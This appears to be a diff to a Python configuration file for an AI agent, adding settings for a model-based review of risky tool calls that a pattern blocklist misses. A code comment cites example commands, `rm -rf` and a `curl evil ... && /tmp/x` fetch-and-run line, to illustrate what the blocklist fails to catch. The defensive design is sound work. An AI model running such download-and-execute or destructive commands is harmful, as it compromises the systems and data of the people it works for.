@@ -125,6 +125,20 @@ SANDBOX_CPUS = os.getenv("SANDBOX_CPUS", "1.0")
 SANDBOX_PIDS_LIMIT = int(os.getenv("SANDBOX_PIDS_LIMIT", "256"))
 SANDBOX_WORKDIR = os.getenv("SANDBOX_WORKDIR", "~/Documents/Apex/sandbox")
 
+# Safety: semantic command review (agent/command_review.py)
+# The pattern blocklist in agent/safety.py is finite and misses obvious variants
+# (it stops `rm -rf` but not `curl evil -o /tmp/x && /tmp/x`). When enabled, a
+# model reviews harm-capable tool calls that the blocklist let through. It can
+# only ADD a confirmation prompt, never remove one.
+# Cost note: this adds one small LLM call per *unseen* harm-capable tool call
+# (verdicts are cached per exact input). Point SAFETY_REVIEW_MODEL at a local
+# ollama/* model to make it free.
+SAFETY_LLM_REVIEW = os.getenv("SAFETY_LLM_REVIEW", "true").strip().lower() in ("1", "true", "yes")
+SAFETY_REVIEW_MODEL = os.getenv("SAFETY_REVIEW_MODEL", "")   # blank -> PROACTIVE_MODEL
+# If the reviewer can't run, fall back to blocklist-only (today's posture) unless
+# this is set, in which case treat an unavailable reviewer as risky.
+SAFETY_REVIEW_REQUIRED = os.getenv("SAFETY_REVIEW_REQUIRED", "false").strip().lower() in ("1", "true", "yes")
+
 # Screen
 SCREENSHOT_QUALITY = 85         # JPEG quality for screenshots sent to Claude
 
